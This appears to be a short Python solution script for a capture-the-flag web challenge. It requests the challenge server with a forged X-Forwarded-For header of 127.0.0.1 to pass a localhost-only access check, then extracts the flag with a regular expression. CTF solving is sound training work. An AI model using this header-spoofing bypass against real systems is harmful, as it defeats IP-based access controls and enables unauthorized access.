import re
import requests

headers = {
    'X-Forwarded-For': '127.0.0.1'
}

response = requests.get('https://nopsctf-outsiders.chals.io/', headers=headers)

print(re.search('N0PS{.+}', response.text).group(0))